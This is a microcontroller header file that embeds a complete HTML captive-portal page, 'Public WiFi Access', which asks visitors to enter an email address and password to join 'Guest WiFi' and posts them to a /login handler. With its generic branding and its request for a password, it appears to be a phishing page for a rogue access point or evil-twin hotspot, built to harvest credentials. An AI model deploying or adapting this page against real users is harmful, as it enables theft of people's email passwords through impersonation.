#ifndef WEB_ASSETS_H
#define WEB_ASSETS_H

const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Public WiFi Access</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 360px; text-align: center; }
        .logo { width: 60px; height: 60px; background: #007aff; border-radius: 12px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; color: white; font-size: 30px; font-weight: bold; }
        h2 { color: #1c1c1e; margin: 0 0 10px; font-size: 24px; font-weight: 600; }
        p { color: #8e8e93; font-size: 15px; margin: 0 0 30px; line-height: 1.4; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #d1d1d6; border-radius: 8px; box-sizing: border-box; font-size: 16px; background: #f2f2f7; }
        input:focus { border-color: #007aff; outline: none; background: white; }
        .checkbox-container { display: flex; align-items: center; margin: 15px 0; font-size: 13px; color: #3a3a3c; }
        input[type="checkbox"] { width: auto; margin-right: 10px; }
        button { background-color: #007aff; color: white; padding: 14px; border: none; border-radius: 8px; width: 100%; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        button:hover { background-color: #0063d1; }
        .error { color: #ff3b30; font-size: 13px; display: none; margin-top: 5px; text-align: left; }
        .spinner { display: none; margin: 20px auto; border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #007aff; width: 20px; height: 20px; -webkit-animation: spin 1s linear infinite; animation: spin 1s linear infinite; }
        @-webkit-keyframes spin { 0% { -webkit-transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); } }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">W</div>
        <h2>WiFi Access</h2>
        <p>Login to "Guest WiFi" to continue.</p>
        <form action="/login" method="POST" onsubmit="return validateForm()">
            <input type="email" id="email" name="email" placeholder="Email Address" required>
            <div id="emailError" class="error">Please enter a valid email address.</div>
            <input type="password" name="password" placeholder="Password" required>
            <div class="checkbox-container">
                <input type="checkbox" id="terms" name="terms" required>
                <label for="terms">I accept the Terms & Conditions</label>
            </div>
            <button type="submit" id="btn">Connect</button>
            <div class="spinner" id="loader"></div>
        </form>
    </div>
    <script>
        function validateForm() {
            var email = document.getElementById("email").value;
            if (email.indexOf('@') === -1) {
                document.getElementById("emailError").style.display = "block";
                return false;
            }
            document.getElementById("btn").style.display = "none";
            document.getElementById("loader").style.display = "block";
            return true;
        }
    </script>
</body>
</html>
)rawliteral";

#endif
